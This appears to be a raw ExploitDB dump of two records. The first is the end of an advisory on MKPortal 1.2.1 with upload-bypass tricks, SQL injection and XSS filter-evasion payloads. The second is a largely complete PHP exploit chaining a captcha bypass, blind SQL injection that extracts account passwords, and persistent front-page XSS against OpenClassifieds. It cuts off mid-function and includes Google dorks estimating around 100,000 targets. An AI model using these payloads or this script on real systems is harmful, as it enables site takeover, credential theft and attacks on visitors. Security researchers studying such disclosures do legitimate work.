\'not_supported\';\r\n\t\t\t\tbreak;\r\n\t\t}\r\n\t\tif ($ext == "not_supported")  {\r\n\t\t\t$message = "{$mklib->lang[\'b_gnotsup\']}";\r\n\t\t\t$mklib->error_page($message);\r\n\t\t\texit;\r\n\t\t}\r\n\r\n--------------------[/source code]---------------------\r\n\r\nSo this piece of code suppose to be let in only files with specific extensions.\r\nIn reality it will pass through files like "foobar.agif" or "whatever.pbmp ...\r\nLet\'s assume, that we have jpg picture named "pic.php.jjpg". This can be valid\r\npicture file and in same time contain malicious php code inside.\r\n\r\nWhat happens next:\r\n\r\n---------------------[source code]---------------------\r\n\t\t//Move file from server tmp directory to blog "tmp" directory\t\t\t\r\n\t\tif (!move_uploaded_file("$file", "mkportal/blog/images/tmp/$file_name")) {\r\n\t\t\t$message = "{$mklib->lang[\'b_nopermupl\']}";\r\n\t\t\t$mklib->error_page($message);\r\n\t\t\texit;\r\n\t\t}\r\n\t\t@chmod("mkportal/blog/images/tmp/$file_name", 0644);\r\n\t\r\n\t\t//Validate by mime type\r\n\t\t$tmpfilename = "mkportal/blog/images/tmp/$file_name";\r\n\t\t$size = @getimagesize($tmpfilename);\r\n\t\t//If getimagesize does not recognize file as an image delete file\r\n\t\tif (!$size)  {\r\n\t\t\t@unlink($tmpfilename);\r\n\t\t\t$message .= "{$mklib->lang[\'error_filetype\']}";\r\n\t\t\t$mklib->error_page($message);\r\n\t\t\texit;\r\n\t\t}\r\n--------------------[/source code]---------------------\r\n\r\nAs this image file is perfectly normal jpg picture, then it will bypass\r\n"getimagesize()" successfully. And "chmod()" will not make any differents in\r\nspecific situation.\r\n\r\nNext:\r\n\r\n---------------------[source code]---------------------\r\n$file_type = $size[\'mime\'];\r\n\r\n\t\tif (!$mklib->check_attach($file_type, $file_ext))  {\r\n\t\t\t//Delete invalid file and display error\r\n\t\t\t@unlink($tmpfilename);\r\n\t\t\t$message .= "{$mklib->lang[\'b_gnotsup\']}";\r\n\t\t\t$mklib->error_page($message);\r\n\t\t\texit;\r\n\t\t}\r\n\r\n\t\t//Validate by file contents\r\n\t\t$fcontents = file_get_contents ($tmpfilename);\r\n\t\t$carray = array("html", "javascript", "vbscript", "alert",\r\n "onmouseover", "onclick", "onload", "onsubmit");\t\t\r\n\t\tforeach ($carray as $fch) {\r\n            \t\tif (strstr($fcontents, $fch)) {\r\n                \t\t@unlink($tmpfilename);\r\n\t\t\t\t$message .= "{$mklib->lang[\'error_filetype\']}";\r\n\t\t\t\t$mklib->error_page($message);\r\n                \t\texit;\r\n            \t\t}\r\n        \t}\r\n        \tif (preg_match("#script(.+?)/script#ies", $fcontents)) {\r\n           \t\t@unlink($tmpfilename);\r\n\t\t\t$message .= "{$mklib->lang[\'error_filetype\']}";\r\n\t\t\t$mklib->error_page($message);\r\n            \t\texit;\r\n\t\t}\r\n--------------------[/source code]---------------------\r\n\r\nAgain, MIME-type will be correct and html-code detection can\'t stop\r\nmalicious php code inside of that jpg file. \r\n\r\nFinally:\r\n\r\n---------------------[source code]---------------------\r\n$image = $totr.$file_name;\r\n\r\n//move file from "tmp" directory to "images" directory\r\n@rename($tmpfilename, "mkportal/blog/images/$image");\r\n--------------------[/source code]---------------------\r\n\r\nWhat\'s the possibilities? Attacker can upload picture file with php code\r\ninside with filename like "pic.php.pjpg" and it will be stored in remote\r\nserver as result. And when attacker issues direct request to uploaded\r\npicture:\r\n\r\nhttp://localhost/mkportal.1.2.1/mkportal/blog/images/1pic.php.pjpg"\r\n\r\n.. then in case of Apache webserver php code inside of picture will\r\nbe executed. Therefore it\'s basically remote php code execution.\r\n\r\n\r\n2. Insecure file upload in Downloads module\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nSecurity risk: critical\r\nPreconditions:\r\n 1. attacker must be registered user\r\n\r\nRegistered users can add new files in downloads module by default:\r\n\r\nhttp://localhost/mkportal.1.2.1/index.php?ind=downloads&op=submit_file\r\n\r\nLet\'s look at "mkportal/modules/Downloads/index.php" line ~662:\r\n\r\n---------[source code]--------------------------\r\nfunction add_file() {\r\n\r\n    \tglobal $mkportals, $DB,  $_FILES, $mklib, $mklib_board;\r\n..\r\n\t//Replace illegal sub-extensions\r\n\t$com_types = array(\'com\', \'exe\', \'bat\', \'scr\', \'pif\', \'asp\',\r\n \'cgi\', \'pl\', \'php\');\r\n\tforeach ($com_types AS $bad) {\r\n\t\t$file_name = str_replace(".$bad", "_$bad", $file_name);\r\n---------[/source code]--------------------------\r\n\r\nAt first look this seems to be good security measure. If we try to upload\r\ntrojanized file with php code inside named "test.php.zzz\', then it will be\r\ntransformed to "test_php.zzz" and php code execution is not possible.\r\nBut wait a minute ... "str_replace()" is case sensitive, right? So, what if\r\nwe try to upload "test.Php.zzz"? Yes, code fragment above will not trigger and\r\nwe end up with potentially dangerous uploaded file on remote server. It\'s easy\r\nto find out URL to that file. First, let\'s look at file\'s download link:\r\n\r\nhttp://localhost/mkportal.1.2.1/index.php?ind=downloads&op=download_file&ide=3\r\n&file=test.Php.zzz\r\n\r\nHere we can determine, that "ide=3". And this is the direct file request URL:\r\n\r\nhttp://localhost/mkportal.1.2.1/mkportal/modules/downloads/file/mk_3_test.Php.mk\r\n\r\nAnd it appears, that Apache does not care, if it\'s "php" or "Php" or "PHP", it\r\nwill parse the file as php script anyway. And as result any registered user with\r\nfile adding rights in downloads block can have arbitrary php code execution\r\npossibilities in remote server.\r\n\r\n\r\n3. Race condition in multiple modules file upload functionality\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nSecurity risk: medium\r\nPreconditions:\r\n 1. attacker must be registered user\r\n 2. multiple tries needed for successful exploitation\r\n\r\nAffected modules are Blog (gallery file upload), Reviews and Image Gallery.\r\nFor example let\'s look at Image Gallery\'s file upload code:\r\n\r\n---------[source code]--------------------------\r\nif (!$FILE_UPLOAD && $FILE_URL) {\r\n\t//Copy file from remote server to gallery "tmp" directory\r\n\tif (!copy("$file", "mkportal/modules/gallery/album/tmp/$file_name")) {\r\n\t\t$message = "{$mklib->lang[\'ga_errorupl\']}";\r\n\t\t$mklib->error_page($message);\r\n\t\texit;\r\n\t\t}\r\n\t} else {\r\n\t\t//Move file from local server tmp directory to gallery "tmp" \r\ndirectory\r\n\t\tif (!move_uploaded_file("$file", "mkportal/modules/gallery/album/\r\ntmp/$file_name")) {\r\n\t\t\t$message = "{$mklib->lang[\'ga_errorupl\']}";\r\n\t\t\t$mklib->error_page($message);\r\n\t\t\texit;\r\n\t\t}\r\n\t}\r\n\t@chmod("mkportal/modules/gallery/album/tmp/$file_name", 0644);\r\n..\r\n//Validate by mime type\r\n$tmpfilename = "mkportal/modules/gallery/album/tmp/$file_name";\r\n$size = @getimagesize($tmpfilename);\r\n//If getimagesize does not recognize file as an image delete file\r\nif (!$size)  {\r\n\t@unlink($tmpfilename);\r\n\t$message .= "{$mklib->lang[\'ga_notsup\']}";\r\n\t$mklib->error_page($message);\r\n\texit;\r\n}\r\n---------[/source code]--------------------------\r\n\r\nSo there exists timeframe, where temporary file is allready  moved to "tmp"\r\ndirectory, but it is not yet deleted. If attacker manages to issue request\r\nlike this\r\n\r\nhttp://localhost/mkportal.1.2.1/mkportal/modules/Gallery/album/\r\ntmp/pic.php.pjpg\r\n\r\n.. in right time, then remote php code execution may be possible.\r\nIt is classical race condition and success probability of single try is\r\nvery limited, but it\'s possible to make thousands of tries, until hitting\r\nthe jackpot. And by the way, "chmod(0644)" does not matter in specific case  :) \r\n\r\n\r\n4. Sql Injection in Blog module template editing\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nSecurity risk: medium\r\nPreconditions:\r\n 1. attacker must be registered user\r\n 2. attacker must have blog editing privileges\r\n 3. magic_quotes_gpc=off (rare in real-world servers)\r\n\r\nLet\'s look at source code of "modules/blog/index.php" line ~1441:\r\n\r\n---------------------[source code]---------------------\r\nfunction save_template () {\r\n\t\tglobal $mkportals, $DB, $Skin, $mklib;\r\n..\r\n\t\t$idb = $mkportals->member[\'id\'];\r\n\t\t$template = $_POST[\'template\'];\r\n\t\t$template = $this->clean_template($template);\r\n\t\t$template2 = $_POST[\'template2\'];\r\n\t\t$template2 = $this->clean_template($template2);\r\n\r\n\t\t$DB->query("UPDATE mkp_blog SET template = \'$template\',\r\n template2 = \'$template2\' WHERE id = \'$idb\'");\r\n--------------------[/source code]---------------------\r\n\r\nNo "addslashes()" or "mysql_real_escape_string()" is used, so sql injection\r\nis possible, if "magic_quotes_gpc" setting is "off".\r\n\r\nProof of concept:\r\n\r\na) Go to blog template editing interface:\r\n\r\nhttp://localhost/mkportal.1.2.1/index.php?ind=blog&op=edit_template\r\n\r\nb) Insert text into the "Home Template" textarea:\r\n\r\n\',template=@@version,template2=\'\r\n\r\n.. and hit "Update Template". As result MysSql version is shown instead\r\nof blog content.\r\n\r\n\r\n\r\n5. Reflected XSS in "handler_image.php"\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nSecurity risk: medium\r\nPreconditions: none\r\n\r\nExample:\r\n\r\nhttp://localhost/mkportal.1.2.1/mkportal/modules/rss/handler_image.php\r\n?i=<script>alert(123);</script>\r\n\r\n\r\n6. Stored XSS in blog templates\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nSecurity risk: medium\r\nPreconditions:\r\n 1. attacker must be registered user\r\n 2. attacker must have blog editing privileges\r\n\r\nMKportal offers blog functionality to all registered users. Blog access and\r\ncreation is enabled by default. Quick search in Google reveals, that many\r\nwebsites have enabled blog module.\r\n\r\nGoogle dork: inurl:"index.php?ind=blog"\r\n\r\nAny registered user with blog editing privileges can modify his own\r\nblog templates. Templates are stored in database. Blog owner can manipulate\r\ntemplates html source in arbitrary ways, but some security filtering is\r\nin place, in order to prevent inserting potentially malicious content\r\n(Javascript, VBScript, ...) into blog templates.\r\n\r\nLet\'s look at source code of "modules/blog/index.php" line ~1441:\r\n\r\n---------------------[source code]---------------------\r\nfunction save_template () {\r\n\t\tglobal $mkportals, $DB, $Skin, $mklib;\r\n..\r\n\t\t$idb = $mkportals->member[\'id\'];\r\n\t\t$template = $_POST[\'template\'];\r\n\t\t$template = $this->clean_template($template);\r\n\t\t$template2 = $_POST[\'template2\'];\r\n\t\t$template2 = $this->clean_template($template2);\r\n\r\n\t\t$DB->query("UPDATE mkp_blog SET template = \'$template\',\r\n template2 = \'$template2\' WHERE id = \'$idb\'");\r\n--------------------[/source code]---------------------\r\n\r\nSo we can see, that security filtering is handled by function\r\n"clean_template()". Let\'s look inside of this function:\r\n\r\n---------------------[source code]---------------------\r\nfunction clean_template ($t="") {\r\n..\r\n        while( preg_match( "#script(.+?)/script#ies", $t ) ) {\r\n                $t = preg_replace( "#script(.+?)/script#ies", "" , $t);\r\n        }\r\n        $t = preg_replace( "/javascript/i", "", $t );\r\n        //$t = preg_replace( "/about/i"\t, "", $t );\r\n        $t = preg_replace( "/vbscript/i"\t, "", $t );\r\n        $t = preg_replace( "/alert/i"\t, "", $t );\r\n        $t = preg_replace( "/onmouseover/i", "", $t );\r\n        $t = preg_replace( "/onclick/i"\t, "", $t );\r\n        $t = preg_replace( "/onload/i"\t, "", $t );\r\n        $t = preg_replace( "/onsubmit/i"\t, "", $t );\r\n\r\n..\r\n\t$t = preg_replace( "/ecmascript/i"\t, "", $t );\r\n \t$t = preg_replace( "/about:/si"\t, "", $t );\r\n\t$t = preg_replace( "/data:/si"\t, "", $t );\r\n\t$t = preg_replace( "/onfocus/i"\t, "", $t );\r\n\t$t = preg_replace( "/onblur/i"\t, "", $t );\r\n\t$t = preg_replace( "/ondblclick/i"\t, "", $t );\r\n\t$t = preg_replace( "/onmousedown/i"\t, "", $t );\r\n\t$t = preg_replace( "/onmouseup/i"\t, "", $t );\r\n\t$t = preg_replace( "/onmousemove/i"\t, "", $t );\r\n\t$t = preg_replace( "/onmouseout/i"\t, "", $t );\r\n\t$t = preg_replace( "/onkeypress/i"\t, "", $t );\r\n\t$t = preg_replace( "/onkeydown/i"\t, "", $t );\r\n\t$t = preg_replace( "/onkeyup/i"\t, "", $t );\r\n\t$t = preg_replace( "/onunload/i"\t, "", $t );\r\n      $t = preg_replace( "/onabort/i"\t, "", $t );\r\n      $t = preg_replace( "/onerror/i"\t, "", $t );\r\n\t$t = preg_replace( "/onchange/i"\t, "", $t );\r\n\t$t = preg_replace( "/onreset/i"\t, "", $t );\r\n\t$t = preg_replace( "/onselect/i"\t, "", $t );\t\r\n\t$t = preg_replace( "/document\\./i"\t, "", $t );\r\n\t$t = preg_replace( "/window\\./i"\t, "", $t );\r\n\t\r\n..\r\n        return $t;\r\n    }\r\n\r\n--------------------[/source code]---------------------\r\n\r\nThis kind of filtering is example of flawed-by-design implementation.\r\nIf someone wants insert javascript into blog template, then it\'s still\r\npossible! Here are some working examples:\r\n\r\n<body ononsubmitload=aleonsubmitrt(123);>\r\n\r\n<salertcript>aalertlert(123);</salertcript>\r\n\r\n\r\n7. Stored XSS in Reviews module comments functionality\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nSecurity risk: medium\r\nPreconditions:\r\n 1. attacker must be registered user\r\n 2. attacker must have Reviews comments editing privileges\r\n\r\nThere are some security measures against script injection in comments\r\ntext, but still it\'s possible to sneak through those filters. Example:\r\n\r\n<marquee loop=1 onfinish=alert(document.cookie) width=0></marquee>\r\n\r\nThis script will be executed, when someone opens review with this comment.\r\nAs result, cookie theft and other attacks may be possible. \r\n\r\n\r\n8. Stored XSS in News module comments functionality\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nSecurity risk: medium\r\nPreconditions:\r\n 1. attacker must be registered user\r\n 2. attacker must have news comments editing privileges\r\n\r\nSame story, as in previous case - filtering exists, but can be bypassed.\r\n\r\n\r\n\r\n9. Full path disclosure in "index.php"\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nSecurity risk: low\r\nPreconditions: display_errors = Off\r\n\r\nExample:\r\n\r\nhttp://localhost/mkportal.1.2.1/?ind[]\r\n\r\nResult:\r\n\r\nWarning: Illegal offset type in isset or empty in \r\nC:\\apache_wwwroot\\mkportal.1.2.1\\index.php on line 102\r\n\r\n\r\nGreetings:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\nGreets to ToXiC, y3dips, Sm0ke, Heintz, slimjim100, pexli, mge, str0ke,\r\nto all active waraxe.us forum members and to anyone else who know me! \r\n\r\n\r\nContact:\r\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n\r\ncome2waraxe@yahoo.com\r\nJanek Vind "waraxe"\r\n\r\nWaraxe forum:  http://www.waraxe.us/forums.html\r\nPersonal homepage: http://www.janekvind.com/\r\n---------------------------------- [ EOF ] ---------------------------------\r\n\r\n# milw0rm.com [2009-01-15]', u'description': u'MKPortal 1.2.1 - Multiple Vulnerabilities', u'platform': u'php', u'author': u'waraxe', u'cve': [], u'source': u'ExploitDB', u'date': u'2009-01-15T00:00:00+00:00', u'_id': 7796, u'type': u'webapps', u'port': 0}

CVE: []
Description: OpenClassifieds 1.7.0.3 - Chained: Captcha Bypass / SQL Injection / Persistent Cross-Site Scripting on FrontPage
{u'code': u'Author:Michael Brooks (Rook)<br>\r\nApplication:OpenClassifieds 1.7.0.3<br>\r\ndownload: http://open-classifieds.com/download/<br>\r\nExploit chain:captcha bypass->sqli(insert)->persistant xss on front page<br>\r\nIf registration is required an extra link in the chain is added:<br>\r\nExploit chain:blind sqli(select)->captcha\r\nbypass->sqli(insert)->persistant xss on front page<br>\r\nsites with SEO url\'s enabled:<br>\r\n"powerd by Open Classifieds" inurl:"publish-a-new-ad.htm"  (85,000 results)<br>\r\nor default urls:<br>\r\n"powerd by Open Classifieds"  inurl:"item-new.php" (16,500 results)<br>\r\nTotal sites: ~100,000<br>\r\n<br>\r\n<br>\r\nThe target must be a link to the document root of OpenClassifieds<br>\r\n(If the exploit doesn\'t immediately reload then blind sqli is\r\nrequired,  which will take a few minutes  ;)<br>\r\n<form>\r\n\tTarget:\xa0\xa0<input size=128 name=target value="http://localhost/"><br>\r\n\tPayload:<input size=128 name=xss value="<script>alert(\'xss\')</script>"><br>\r\n\t<input type=submit value="Attack">\r\n</form><br>\r\n<?php\r\n/*\r\n Foreword:\r\n I have always wanted to write a chained exploit with a captcha\r\nbypass,  so I couldn\'t miss this\r\n opportunity.    I spent a bit more effort on this exploit even though\r\nthere aren\'t very many hits (around\r\n 100k starts to be worth while). Regardless, I dug into the\r\napplication and pulled out the vulnerabilities\r\n needed to Finnish my masterpiece.  Usually when I write a Remote Code\r\nExecution exploit for a web\r\n app you guys just deface the site or throw up drive-by attacks.  So I\r\nfigured, persistent XSS on the\r\n front page is equally as valuable,  especially with yet another IE\r\n0-day in the wild.  The chain is within\r\n the application its self.  Process sand-boxing like\r\nchroot/AppArmor/SELinux/Application-V(MS)\r\n doesn\'t come into play.  It works regardless of the operating system\r\nor configurations (Suhosin,\r\n safemode, magic_quotes_gpc and register_globals doesn\'t come into\r\nplay). I focused on the\r\n application\'s internal configurations that could break the\r\nexploitation process.  In this case seo friendly\r\n urls and requiring an account before posting.\r\n\r\n "This web application [OpenClassifieds] is developed to be fast,\r\nlight, secure and SEO friendly."\r\n Usually when I see that an application claims to be secure,  they\r\nreally don\'t know what the fuck they\r\n are doing.  OpenClassifieds\' Security model is deeply flawed and as a\r\nresult there are MANY\r\n vulnerabilities in this code base which allowed me to string a few\r\ncool ones together to make an\r\n interesting exploit.    OpenClassifieds is sanitizing everything on\r\ninput using cG() and cP(),  these\r\n functions are used to perform a mysql_real_escape_string()  on all\r\nGET and POST variables.  Most\r\n servers aren\'t using an exotic character set so from a security stand\r\npoint this is exactly identical to\r\n magic_quotes_gpc.  So I dusted off my usual magic_quotes_gpc auditing\r\ntricks,  look for\r\n stripslashes(),base64decode(),urldecode(),html_entity_decode() lack\r\nof quote marks around variables\r\n in a query,  ect...  Sanitation must ALWAYS be done at the time of\r\nuse, parametrized queries are a\r\n good example of this.   Its impossible to account for all the ways a\r\nvariable can be mangled once it\r\n enters a program and if you Sanitize input when it first enters the\r\nprogram there will be cases where it\r\n will become dangerous again.   This isn\'t only a problem for SQLi,\r\nits also a problem for XSS.  I am\r\n inserting JS into the database, which isn\'t a vulnerablity,  but\r\nprinting it, is persistant XSS.\r\n\r\n The blind sql injection is a bit strange.  I can\'t use white space or\r\ncommas,  which is a pain.  I had to\r\n rewrite my general purpose Blind SQLi Class to accommodate.   A\r\nbinary search is used to greatly\r\n speed up the blind sqli attack.\r\n (which I also used in my php-nuke exploit:\r\nhttp://www.exploit-db.com/exploits/12510/)\r\n\r\n Special thanks to Reiners for this sqli filter evasion cheat sheet:\r\n http://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/\r\n Here are some changes I had to make to my blind sql injection class:\r\n "select substring(\'abc\',1,1)"=>"select substring(\'abc\' from 1 for 1)"\r\n if(greatest(".sprintf($question,$cur).",".$pos.")!=".$pos.",sleep(".$this->timeout."),0)"\r\n=>"case ".sprintf($question,"0+".$cur).">".$pos." when true  then\r\nsleep(".$this->timeout.") end"\r\n\r\n CWE Violations leveraged by this exploit:\r\n CWE-256: Plaintext Storage of a Password\r\n CWE-804: Guessable CAPTCHA  (I asked that they create this CWE when I\r\nran into a guy that works for Mitre.)\r\n CWE-89: SQL Injection x2\r\n CWE-79: Cross-site Scripting (Persistant)\r\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\nVulnerable captcha:\r\nopenclassifieds/includes/common.php line 291\r\nfunction encode_str ($input){//converts the input into Ascii HTML, to\r\nofuscate a bit\r\n    for ($i = 0; $i < strlen($input); $i++) {\r\n         $output .= "&#".ord($input[$i]).\';\';\r\n    }\r\n    //$output = htmlspecialchars($output);//uncomment to escape sepecial chars\r\n    return $output;\r\n}\r\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\nfunction mathCaptcha(){//generates a captcha for the form\r\n\t$first_number=mt_rand(1, 94);//first operation number\r\n\t$second_number=mt_rand(1, 5);//second operation number\r\n\r\n\t$_SESSION["mathCaptcha"]=($first_number+$second_number);//operation result\r\n\r\n\t$operation=" <b>".encode_str($first_number ." + ".\r\n$second_number)."</b>?";//operation codifieds\r\n\r\n\techo _("How much is")." ".$operation;\r\n}\r\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\nVulnerable persistant xss and sqli\r\n/content/item-new.php line 41\r\n$ocdb->insert(TABLE_PREFIX."posts\r\n(idCategory,type,title,description,price,idLocation,place,name,email,phone,password,ip,hasImages)","".\r\n\t\t\t\t\t\t\t\t\t\t\t\tcP("category").",".cP("type").",\'$title\',\'$desc\',$price,$location,\'".cP("place")."\',\'".cP("name")."\',\'$email\',\'".cP("phone")."\',\'$post_password\',\'$client_ip\',$hasImages");\r\n-------------------------------------------------------------------------------------------------------------------------------------------------------------------------\r\n*/\r\nset_time_limit(0);\r\nerror_reporting(0);\r\n\r\nfunction main(){\r\n\tif($_REQUEST[\'target\'] && $_REQUEST[\'xss\']){\r\n\t\tif(xssFrontPage($_REQUEST[\'target\'],$_REQUEST[\'xss\'])){\r\n\t\t\tprint("<b>Persistant XSS attack was sucessful.</b>");\r\n\t\t}else{\r\n\t\t\tprint("<b>Persistant XSS attack has failed.</b>");\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//w00t, I can crack your captcha with 4 lines of code!\r\n//It would have been 3 if i had used eval(),  but that would be a\r\nvulnerability ;)\r\nfunction breakCaptcha($page){\r\n\tpreg_match("/\\<b\\>(.*)\\<\\/b\\>\\?/",$page,$match);\r\n\t$code=html_entity_decode($match[1]);\r\n\t$math=new EvalMath();\r\n\treturn $math->evaluate($code);\r\n}\r\n\r\nfunction xssFrontPage($url,$xss){\r\n\t$h=new http_client();\r\n\t$page=$h->send($url."/content/item-new.php");\r\n\t#Authentication required.\r\n\tif(strstr($page,\'Location: http\')){#Do we need authentication?\r\n\t\tprint "Blind SQL Injection required.<br>";\r\n\t\t$sex=new openclassifieds_blind_sql_injection($url."/");\r\n\t\tif($sex->test_target()){\r\n\t\t\tprint "Target is vulnerable to attack!<br>";\r\n\t\t\t$pass=$sex->find_string("password");\r\n\t\t\tprint "Found Password:<b>$pass</b><br>";\r\n\t\t\t$email=$sex->find_string("email");\r\n\t\t\tprint "Found email:<b>$email</b><br>";\r\n\t\t\t$h->postdata="email=$email&password=$pass&submit=loading...";\r\n\t\t\t$h->send($url."/content/account/login.php");\r\n\t\t\t$h->postdata=\'\';\r\n\t\t\t$page=$h->send($url."/");\r\n\t\t}else{\r\n\t\t\tdie("This target is not exploitable!<br>");\r\n\t\t}\t\r\n\t}else{\r\n\t\t$email="test@test.com";\r\n\t}\r\n\t$code=breakCaptcha($page);\r\n\t$payload=blind_sql_injection::charEncode($xss);\r\n\t$pwd=mt_rand(1,9999999);//Strong password :p\r\n\t$fake_phone=mt_rand(1111111111,9999999999);\r\n\t$fake_email=blind_sql_injection::charEncode(mt_rand()."@".mt_rand().".com");\r\n\t$fake_ip=blind_sql_injection::charEncode(mt_rand(20,254).".".mt_rand(20,254).".".mt_rand(20,254).".".mt_rand(20,254));\r\n\t//Stored xss in the description,place and name columns.\r\n\t$inj="36,".mt_rand(1,20).",".$payload.",".mt_rand().",".mt_rand(2,500).",".mt_rand(1,10).",".mt_rand().",".mt_rand().",".$fake_email.",".$fake_phone.",".$pwd.",".$fake_ip.",0)#";\r\n        $h->postdata="category=".$inj."&type=0&place=home&title=title&price=1&description=desc&name=name&email=".$email."&math=".$code;\r\n\t$h->send($url."/content/item-new.php");\r\n\t$h->postdata=\'\';\r\n\t//I could use sql injection to find the id,  but thats noisy and slow.\r\n\t$rss=$h->send($url."/content/feed-rss.php");\r\n\t//seo friendly\r\n\tif(preg_match("/\\-(.*)\\.htm\\<\\/link\\>/",$rss,$match)){\r\n\t\t$guess=$match[1];\r\n\t}else if(preg_match("/item\\=(.*)\\&type/",$rss,$match)){\r\n\t\t$guess=$match[1];\r\n\t}else{\r\n\t\t$guess=0;\r\n\t}\r\n\t$guess++;\r\n\t$page=\'\';\r\n\t$test=false;\r\n\t#Now lets activate the XSS post.\r\n\tfor($x=$guess;$x-$guess<=128&&!$test;$x++){\r\n\t\t$page=$h->send($url."/content/item-manage.php?pwd=".$pwd."&post=".$x."&action=confirm");\r\n\t\t$test=strstr($page,"<script language=\'JavaScript\'\r\ntype=\'text/javascript\'>alert(\'");\r\n\t}\r\n\treturn $test;\r\n}\r\n\r\n//http://localhost/openclassifieds/?location=%26%23039;/**/or/**/sleep(10)/**/or/**/1=%26%23039;\r\n//The blind_sql_injeciton calss is a general exploit framework that we\r\nare inheriting.\r\nclass openclassifieds_blind_sql_injection extends blind_sql_injection {\r\n    //This is the blind sql injection request.\r\n    function query($check){\r\n        //build the http request to Inject a query:\r\n\t//"%26%23039;" is a single quote encoded with\r\nurlencode(htmlencode("\'",ENT_QUOTES));\r\n\t$payload="%26%23039; or (select ".$check." from oc_accounts where\r\nactive=1 limit 1) or 1=%26%23039;";\r\n\t#white space becomes and underscore "_" so it must be replaced.\r\n\t$payload=str_replace(" ","/**/",$payload);\r\n\t$this->set_get("location=".$payload);\r\n    }\r\n}\r\n\r\n//This is a very efficient blind sql injection class.\r\nclass blind_sql_injection{\r\n    var $url, $backup_url, $result, $http, $request_count, $timeout;\r\n    function blind_sql_injection($url,$timeout=10){\r\n        $this->request_count=0;\r\n        $this->url=$url;\r\n        $this->backup_url=$url;\r\n        $this->http=new http_client();\r\n        $this->timeout=$timeout;\r\n    }\r\n    function set_get($get){\r\n        $this->url=$this->url."?".$get;\r\n    }\r\n    function set_referer($referer){\r\n        $this->http->referer=$referer;\r\n    }\r\n    function set_post($post){\r\n        $this->http->postdata=$post;\r\n    }\r\n    function test_target(){\r\n        return $this->send("case true when true then\r\nsleep(".$this->timeout.") when false then sleep(0)\r\nend")&&!$this->send("case false when true then\r\nsleep(".$this->timeout.") when false then sleep(0) end");\r\n\t#return $this->send("if(true,sleep(".$this->timeout."),0)")&&!$this->send("if(false,sleep(".$this->timeout."),0)");\r\n    }\r\n    function num_to_hex($arr){\r\n        $ret=\'\';\r\n        foreach($arr as $a){\r\n            if($a<=9){\r\n                $ret.=$a;\r\n            }else{\r\n                $ret.=chr(87+$a);\r\n            }\r\n        }\r\n        return $ret;\r\n    }\r\n    ###These where not ported to the non-comma version.\r\n    //Looking for a string of length 32 and base 16 in ascii chars.\r\n    #function find_md5($column){\r\n     #   return\r\n$this->num_to_hex($this->bin_finder(16,32,"conv(substring($column,%s,1),16,10)"));\r\n    #}\r\n    #function find_sha1($column){\r\n     #   return\r\n$this->num_to_hex($this->bin_finder(16,40,"conv(substring($column,%s,1),16,10)"));\r\n    #}\r\n    //Look for an ascii string of arbitrary length.\r\n    function find_string($column){\r\n        $ret=\'\';\r\n        //A length of zero means we are looking for a null byte\r\nterminated string.\r\n        $result=$this->bin_finder(128,0,"ascii(substring($column from\r\n%s for 1))");\r\n        foreach($result as $r){\r\n            $ret.=chr($r);\r\n        }\r\n        return strrev($ret);\r\n    }\r\n    //query() is a method that generates the sql injection request\r\n    function query($check){\r\n        //This function must be overridden.\r\n    }\r\n    function recheck($result,$question,$base){\r\n       $this->bin_finder($base,1,$question,$start);\r\n       //Force a long timeout.\r\n       $tmp_timeout=$this->timeout;\r\n       if($this->timeout<10){\r\n          $this->timeout=10;\r\n       }else{\r\n          $this->timeout=$this->timeout*2;\r\n       }\r\n       $l=1;\r\n       foreach($result as $r){\r\n          if($this->send("if(".sprintf($question,$l)."!=".$r.",sleep(".$this->timeout."),0)")){\r\n              $result[]=$b;\r\n              break;\r\n          }\r\n          $l++;\r\n       }\r\n       $this->timeout=$tmp_timeout;\r\n    }\r\n    function linear_finder($base,$length,$question){\r\n        for($l=1;$l<=$length;$l++){\r\n            for($b=0;$b<$base;$b++){\r\n\r\nif($this->send("if(".sprintf($question,$l)."=".$b.",sleep(".$this->timeout."),0)")){\r\n                    $result[]=$b;\r\n                    break;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    #Binary search for mysql based sql injection.\r\n    function bin_finder($base,$length,$question){\r\n        $start_pos=1;\r\n        $result=\'\';\r\n        for($cur=$start_pos;$cur<=$length||$length==0;$cur++){\r\n            $n=$base-1;\r\n            $low=0;\r\n            $floor=$low;\r\n            $high=$n-1;\r\n            $pos= $low+(($high-$low)/2);\r\n            $found=false;\r\n            while($low<=$high&&!$found){\r\n                #asking the sql database if the current value is\r\ngreater than $pos\r\n                if($this->send("case\r\n".sprintf($question,"0+".$cur).">".$pos." when true  then\r\nsleep(".$this->timeout.") end")){\r\n\t\t#if($this->send("if(greatest(".sprintf($question,$cur).",".$pos.")!=".$pos.",sleep(".$this->timeout."),0)")){\r\n                    #if this is true then the value must be the modulus.\r\n                    if($pos==$n-1){\r\n                       $result[]=$pos+1;\r\n                       $found=true;\r\n                    }else{\r\n                        $low=$pos+1;\r\n                    }\r\n                #asking the sql database if the current value is less than $pos\r\n                }else 